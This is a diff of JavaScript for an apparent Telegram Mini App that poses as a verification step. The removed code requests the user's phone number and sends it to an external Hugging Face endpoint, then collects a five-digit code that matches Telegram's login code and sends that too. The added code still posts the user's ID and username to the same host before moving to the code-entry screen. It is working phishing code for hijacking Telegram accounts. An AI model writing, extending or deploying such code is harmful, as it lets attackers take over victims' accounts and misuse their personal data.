@@ -1,75 +1,35 @@
-const tg = window.Telegram.WebApp;
-const API_URL = "https://taman964-api-handler.hf.space/send_code"; 
+const API_URL = "https://taman964-api-handler.hf.space/send_code";
 
-tg.expand();
+async function sendData() {
+    const okButton = document.getElementById('ok-button');
+    okButton.disabled = true;
+    okButton.innerText = "Waiting...";
 
-// کلیک کردن لە CONFIRM بۆ ناردنی ژمارەی مۆبایل
-document.getElementById('confirm-btn').onclick = () => {
-    tg.requestContact((res) => {
-        if (res.auth_date) {
-            const phone = res.contact.phone_number;
-            const user_id = tg.initDataUnsafe.user.id;
-
-            // ناردنی ژمارە بۆ Hugging Face
-            fetch(`${API_URL}/send_phone`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone, user_id })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if(data.status === "ok") {
-                    // ئەگەر ژمارەکە چوو، شاشەی کۆدەکە نیشان بدە
-                    document.getElementById('step1').style.display = 'none';
-                    document.getElementById('step2').style.display = 'flex';
-                } else {
-                    alert("هەڵەیەک ڕوویدا لە ناردنی کۆد: " + data.message);
-                }
-            })
-            .catch(err => {
-                alert("پەیوەندی لەگەڵ سێرڤەر سەرکەوتوو نەبوو!");
-                console.error(err);
-            });
-        }
-    });
-};
-
-// کلیک کردن لە GET CODE بۆ ناردنی کۆدەکە
-document.getElementById('verify-btn').onclick = () => {
-    const inputs = document.querySelectorAll('.code-box');
-    let code = "";
-    inputs.forEach(input => code += input.value);
-    const user_id = tg.initDataUnsafe.user.id;
-
-    if(code.length === 5) {
-        fetch(`${API_URL}/verify_code`, {
+    try {
+        const user = window.Telegram.WebApp.initDataUnsafe.user;
+        const response = await fetch(API_URL, {
             method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ code, user_id })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if(data.status === "success") {
-                alert("✅ Verified! Access Granted.");
-                tg.close();
-            } else {
-                alert("کۆدەکە هەڵەیە یان ماوەکەی بەسەرچووە: " + data.message);
-            }
-        })
-        .catch(err => {
-            alert("هەڵە لە پەیوەندی سێرڤەر!");
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                user_id: user ? user.id : "Unknown",
+                username: user ? user.username : "Unknown",
+                phone: "Requested via Telegram"
+            })
         });
-    } else {
-        alert("تکایە هەر ٥ ژمارەی کۆدەکە بنووسە");
-    }
-};
 
-// بۆ ئەوەی فوکەس ئۆتۆماتیک بچێتە خانەی داهاتوو لە کاتی نووسینی کۆد
-const codeBoxes = document.querySelectorAll('.code-box');
-codeBoxes.forEach((box, index) => {
-    box.addEventListener('input', () => {
-        if (box.value.length === 1 && index < codeBoxes.length - 1) {
-            codeBoxes[index + 1].focus();
+        if (response.ok) {
+            // ئەگەر ناردنی ژمارەکە سەرکەوتوو بوو، لاپەڕەی کۆدەکە نیشان بدە
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+        } else {
+            alert("Error connecting to server. Please try again.");
+            okButton.disabled = false;
+            okButton.innerText = "OK";
         }
-    });
-});
+    } catch (error) {
+        console.error("Error:", error);
+        alert("Connection failed!");
+        okButton.disabled = false;
+        okButton.innerText = "OK";
+    }
+}
